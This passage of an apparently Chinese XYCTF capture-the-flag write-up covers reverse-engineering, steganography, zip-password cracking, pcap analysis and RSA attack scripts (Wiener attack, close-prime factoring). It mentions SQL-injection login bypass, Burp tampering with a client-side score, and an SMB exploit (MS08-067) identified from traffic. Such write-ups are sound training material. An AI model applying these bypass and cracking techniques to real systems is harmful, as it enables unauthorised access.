class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="trustme"><a class="markdownIt-Anchor" href="#trustme"></a> Trustme</h3><p>​非预期解：sql注入,万能密码直接出</p><p>​预期解：先用<code>jadx</code>看看<code>mainactivity</code>，解出一个提示，账号是<code>admin</code>；你看到的其实是假逻辑，真正的主函数被加固到dex里，可以从<code>ProxyApplication</code>中找到<code>classes.dex</code>的加密逻辑，即异或255然后写回apk;然后发现是从本地<code>mydb.db</code>中查询；直接拿到这个文件直接<code>strings</code>就能找到flag</p><h3 id="baby-unity"><a class="markdownIt-Anchor" href="#baby-unity"></a> baby unity</h3><p>考点：il2cpp-unity逆向</p><p>利用il2cppdumper利用gm.dat把gameassembly.dll给dump出来；然后ida打开，恢复符号，利用cs文件找到函数的主逻辑，发现是个简单的异或</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'XIcKYJU8Buh:UeV:BKN&#123;U[JvUL??VuZ?CXJ;AX^&#123;Ae]gA[]gUecb@K]ei^22'</span>enc_2<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    enc_2<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xF</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_2<span class="token punctuation">)</span><span class="token keyword">import</span> base64<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_2<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2><h3 id="熊博士"><a class="markdownIt-Anchor" href="#熊博士"></a> 熊博士</h3><blockquote><p>atbash cipher</p></blockquote><h3 id="ez_隐写"><a class="markdownIt-Anchor" href="#ez_隐写"></a> ez_隐写</h3><blockquote><p>伪加密，watermark，图片宽高爆破</p></blockquote><p>有个压缩包，图片伪加密，先修复，把图片搞出来，然后修复宽高，得到提示：密码是开赛日</p><p>然后解压加密压缩包：名字是watermark，就是盲水印</p><p>利用吾爱破解论坛的watermark软件可以得到flag</p><h3 id="game"><a class="markdownIt-Anchor" href="#game"></a> game</h3><blockquote><p>谷歌识图</p></blockquote><h3 id="zzl的护理小课堂"><a class="markdownIt-Anchor" href="#zzl的护理小课堂"></a> zzl的护理小课堂</h3><p>F12查看源码，发现是本地验证</p><p>7050</p><p>有两种方式：</p><p>1.在这段代码前打个断点，然后控制台修改score=101</p><p>2.用burp改包，直接把服务端返回的 score改为101再返回本地浏览器</p><h3 id="zip神之套"><a class="markdownIt-Anchor" href="#zip神之套"></a> zip神之套</h3><blockquote><p>压缩包密码爆破，明文攻击</p></blockquote><p>用ida打开给的exe文件，搜索字符串，给了个hint：密码是<code>xyctf????????ftcyx</code></p><p>7291</p><p>用这种方式爆破</p><p>然后有两个zip，其中一个没加密，一个加密了，flag藏在加密的压缩包，然后ARPCH明文攻击</p><h3 id="tcpl"><a class="markdownIt-Anchor" href="#tcpl"></a> tcpl</h3><p>risk-v架构程序，用qemu搭个riscv的虚拟机然后运行就可以出</p><h3 id="网络迷踪"><a class="markdownIt-Anchor" href="#网络迷踪"></a> 网络迷踪</h3><p>wireshark 跟踪tcp流量</p><p>随便翻翻，发现一段flag文本</p><p>随波逐流一把嗦 xxencode</p><pre class="line-numbers language-none"><code class="language-none">XYCTF&#123;fake_flag&#125;真正的flag格式：XYCTF&#123;靶机ip地址_nmap扫描出的靶机开放的端口(由大到小排列 中间用_进行连接)_获取靶机shell使用的漏洞的CVE编号&#125;例：XYCTF&#123;1.1.1.1_888_88_8_CVE-2009-3103&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那就一步一步分析nmap的流量特征</p><p>回[SYN,ACK]的那三个TCP流量所展示的端口就是开放端口 135,139,445 然后因为是受害者回应攻击者，所以靶机IP为回应IP，即 192.168.204.133</p><p>CVE:SMB以及 IPC有关 的windows漏洞有关  直接搜索关键字 定位到 # Microsoft Windows Server - Code Execution (MS08-067)对应的CVE为CVE-2008-4250</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h3><p>这道题目还是挺不错的，我当时卡了挺久，实际上你同构想一想把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">p^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>当做p与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>q</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">q^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>当做q就能利用wienerattack</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympy <span class="token keyword">as</span> sp<span class="token comment"># p = getPrime(512)</span><span class="token comment"># q = getPrime(512)</span><span class="token comment"># d = getPrime(512)</span><span class="token comment"># e = gmpy2.invert(d, (p**3 - 1) * (q**3 - 1))</span><span class="token comment"># print(e)</span><span class="token comment"># print(p * q)</span>e<span class="token operator">=</span><span class="token number">172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span>pq<span class="token operator">=</span><span class="token number">99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><span class="token comment"># x=sp.symbols('x')</span><span class="token comment"># while True:</span><span class="token comment">#     a=e//k*n</span><span class="token comment">#     equation=sp.Eq(x**2+(n+1)*x+n**2-n+1-a,0)</span><span class="token comment">#     solutions = sp.solveset(equation, x, domain=sp.Naturals)</span><span class="token comment">#     if solutions:</span><span class="token comment">#         print("解",solutions)</span><span class="token comment">#         break</span><span class="token comment">#     k+=1</span><span class="token keyword">import</span> gmpy2<span class="token comment"># numerator(n):分子, denominator(d)：分母</span><span class="token keyword">def</span> <span class="token function">t_cf</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将分数 x/y 转为连分数的形式</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> d<span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n <span class="token operator">//</span> d<span class="token punctuation">)</span>        n<span class="token punctuation">,</span> d <span class="token operator">=</span> d<span class="token punctuation">,</span> n <span class="token operator">%</span> d    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">cf</span><span class="token punctuation">(</span>sub_res<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 得到渐进分数的分母和分子</span>    n<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> sub_res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># 从后面往前循环</span>        d<span class="token punctuation">,</span> n <span class="token operator">=</span> n<span class="token punctuation">,</span> i <span class="token operator">*</span> n <span class="token operator">+</span> d    <span class="token keyword">return</span> d<span class="token punctuation">,</span> n<span class="token keyword">def</span> <span class="token function">list_fraction</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 列出每个渐进分数</span>    res <span class="token operator">=</span> t_cf<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>cf<span class="token punctuation">,</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将连分数的结果逐一截取以求渐进分数</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">get_pq</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 由p+q和pq的值通过维达定理来求解p和q(解二元一次方程)</span>    par <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>b <span class="token operator">*</span> b <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> a <span class="token operator">*</span> c<span class="token punctuation">)</span>  <span class="token comment"># 由上述可得，开根号一定是整数，因为有解</span>    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">+</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">-</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span>    <span class="token keyword">return</span> x1<span class="token punctuation">,</span> x2<span class="token keyword">def</span> <span class="token function">wienerAttack</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>d<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> list_fraction<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span>        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可能会出现连分数的第一个为0的情况，排除</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span>            <span class="token keyword">continue</span>        phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k  <span class="token comment"># 这个结果就是 φ(n)</span>        px<span class="token punctuation">,</span> qy <span class="token operator">=</span> get_pq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> px <span class="token operator">*</span> qy <span class="token operator">==</span> n<span class="token punctuation">:</span>            p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>qy<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 可能会得到两个负数，负负得正未尝不会出现</span>            flag <span class="token operator">=</span> <span class="token string">"XYCTF&#123;"</span> <span class="token operator">+</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>q<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>            <span class="token keyword">return</span> d    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"求解d失败"</span><span class="token punctuation">)</span>d<span class="token operator">=</span>wienerAttack<span class="token punctuation">(</span>e<span class="token punctuation">,</span>pq<span class="token operator">**</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment">#flag = "XYCTF&#123;" + hashlib.md5(str(p + q).encode()).hexdigest() + "&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="happy-to-solve1"><a class="markdownIt-Anchor" href="#happy-to-solve1"></a> happy to solve1</h3><blockquote><p>异或的性质  p，q非常接近分解pq</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2n<span class="token operator">=</span><span class="token number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span>c<span class="token operator">=</span><span class="token number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><span class="token comment"># # from secrets import flag</span><span class="token comment">#</span><span class="token comment">#</span><span class="token keyword">def</span> <span class="token function">get_happy_prime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> qp<span class="token punctuation">,</span>q<span class="token operator">=</span>get_happy_prime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>t1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span> <span class="token operator">+</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">while</span> n <span class="token operator">%</span> p <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> signin</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2flag <span class="token operator">=</span> <span class="token string">b'XYCTF&#123;'</span>flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#Padding 不足514位补0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    leak <span class="token operator">+=</span> <span class="token string">"0"</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">514</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token comment">#高位和低位交换位置</span><span class="token keyword">def</span> <span class="token function">swap_bits</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>input_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> input_list<span class="token punctuation">[</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>        input_list<span class="token punctuation">[</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> temp    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>input_str <span class="token operator">=</span> leakresult <span class="token operator">=</span> swap_bits<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span>a <span class="token operator">=</span> result<span class="token keyword">def</span> <span class="token function">custom_add</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">reverse_custom_add</span><span class="token punctuation">(</span>result_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>result_str<span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>input_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span>    input_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>input_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> input_strinput_str <span class="token operator">=</span> aresult <span class="token operator">=</span> custom_add<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span>b <span class="token operator">=</span> result<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567780012455678012234677801133467889112356678911245567891223457790013346788912235667801134456899122355788001235578891124566799013445778012235578800123467889112456678001245567991223557880012455788901334677800134456789122355788001235578890133566790013445778012235577900133467889112356678001245578801233467789112355779912234577990233556780113</span>re_b<span class="token operator">=</span>reverse_custom_add<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re_b<span class="token punctuation">)</span>sp_re_b<span class="token operator">=</span>swap_bits<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>re_b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sp_re_b<span class="token punctuation">)</span>sp_re_b<span class="token operator">=</span><span class="token string">'1011000010110010100001101010100010001100111101101100010001100010011100100110101001110010011001100110100001101000010110100110000001100100110010000110110001011010011010001100010001110010011100000101101001110010011000100111001001101000010110100110110001101100011001100111001001101000011000001100100001100010011100101100110001110000110001001111101'</span>r_leak<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sp_re_b<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r_leak<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>r_leak<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="babyrsamax"><a class="markdownIt-Anchor" href="#babyrsamax"></a> BabyRSAMAX</h3><p>题目：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> choiceflag <span class="token operator">=</span> <span class="token string">b'XYCTF&#123;******&#125;'</span>e <span class="token operator">=</span> <span class="token string">'?'</span><span class="token keyword">def</span> <span class="token function">getBabyPrime</span><span class="token punctuation">(</span>nbits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> p<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> nbits<span class="token punctuation">:</span>            p <span class="token operator">*=</span> choice<span class="token punctuation">(</span>sieve_base<span class="token punctuation">)</span>                <span class="token keyword">if</span> isPrime<span class="token 